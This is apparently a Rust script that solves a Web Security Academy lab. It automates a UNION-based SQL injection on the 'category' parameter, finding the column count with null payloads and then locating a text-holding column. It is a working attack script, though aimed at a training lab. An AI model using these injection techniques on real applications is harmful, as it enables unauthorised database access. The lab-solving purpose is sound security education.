/***********************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 18/9/2023
*
* Lab: SQL injection UNION attack, finding a column containing text
*
* Steps: 1. Inject payload into 'category' query parameter to determine
*           the number of columns
*        2. Add one additional null column at a time
*        3. Repeat this process, increasing the number of columns until you
*           receive a valid response
*        4. After determining the number of columns, replace each column with
*           the desired text one at a time.
*        5. Repeat this process until you receive a valid response.
*
************************************************************************************/
#![allow(unused)]
/***********
 * Imports
 ***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a3000d004754bfc81ef6c1f006d008e.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection parameter:".blue(),
        "category".yellow()
    );
    io::stdout().flush();

    // fetch the main pages
    let main = client
        .get(url)
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the main page".red()));
    // body of the main page
    let body = main.text().unwrap();
    // extract the desired text
    let desired_text = capture_pattern("Make the database retrieve the string: '(.*)'", &body)
        .expect(&format!(
            "{}",
            "[!] Failed to extract the wanted text to return. this will be fixed after reseting the lab".red()
        ));

    println!(
        "{} {}",
        "[#] Desired text:".blue(),
        desired_text.yellow()
    );
    io::stdout().flush();

    for i in 1..10 {
        // number of nulls
        let nulls = "null, ".repeat(i);
        // payload to retreive the number of columns
        let mut payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // replace the last coma to make the syntax valid
        println!("[*] Trying payload: {}", payload);
        // fetch the page with the injected payload
        let null_injection = client
            .get(format!("{url}/filter?category={payload}"))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to determine the number of columns"
                    .red()
            ));
        // body of the response
        let body = null_injection.text().unwrap();
        // extract error text to determine if the payload is valid or not
        let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
        // if the error text doesn't exist
        if internal_error.is_none() {
            println!(
                "[#] {}{}",
                "Number of columns: ".white(),
                i.to_string().green().bold()
            );
            for j in 1..i + 1 {
                let mut new_payload = payload.clone(); // copy the payload to work on the new copied one
                // these formulas works only for this lab
                let start = 9 + 6 * j; // start index to edit
                let end = (9 + 6 * j) + 4; // end index to edit
                // adjust the payload to check for a column containnig text
                new_payload.replace_range(start..end, &format!("'{desired_text}'",));
                println!("[*] Trying payload: {}", new_payload);
                // fetch the page with the injected payload
                let text_null_injection = client
                    .get(format!("{url}/filter?category={new_payload}"))
                    .send()
                    .expect(&format!( "{}",
                        "[!] Failed to fetch the page with the injected payload to determine the number of columns"
                            .red()
                    ));
                // body of the response
                let body = text_null_injection.text().unwrap();
                // extract error text to determine if the payload is valid or not
                let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
                // if the error text doesn't exist
                if internal_error.is_none() {
                    println!(
                        "[#] {}{}",
                        "the column containing text: ".white(),
                        j.to_string().green().bold()
                    );
                    break;
                }
            }
            break;
        } else {
            continue;
        }
    }
    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
